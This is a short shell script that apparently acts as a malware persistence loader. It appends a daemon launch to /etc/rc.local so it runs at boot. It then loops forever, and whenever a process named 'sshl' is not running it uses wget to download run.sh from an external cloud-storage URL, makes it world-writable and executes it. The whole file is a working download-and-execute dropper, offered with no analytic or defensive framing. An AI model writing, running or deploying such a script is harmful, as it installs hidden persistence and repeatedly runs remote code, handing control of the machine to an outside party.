#!/bin/sh
dir="/usr/sshl/"
shell="run.sh"
shellUrl="https://skyxx.oss-cn-beijing.aliyuncs.com/run.sh"
shellPath=$dir$shell

#process name
PRO_NAME="sshl"

# rc start
grep "run-daemon.sh" /etc/rc.local > /dev/null
if [ $? -eq 0 ]; then
    echo "Found!"
else
    echo "Not found!"
    chmod +x /etc/rc.local
    echo "nohup /var/run-daemon.sh&" >> /etc/rc.local
fi

sleep 180

#loop
while true ; do
 service=`ps aux | grep ${PRO_NAME} | grep -v grep`
 if [ ! "$service" ]; then
 # restart
 mkdir $dir

 # download shell
 wget -O $shellPath $shellUrl

 # setting auth
 chmod 777 $shellPath

 # run
 $shellPath
 fi
 sleep 60
done
